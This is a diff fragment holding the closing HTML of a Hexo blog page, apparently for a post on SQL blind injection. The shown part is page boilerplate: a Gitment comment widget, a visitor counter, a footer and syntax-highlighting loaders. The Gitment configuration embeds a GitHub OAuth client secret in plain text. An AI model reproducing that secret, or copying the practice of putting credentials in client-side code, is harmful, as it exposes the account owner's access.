+      var gitment = new Gitment({
+        id: "sql盲注(附python脚本)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
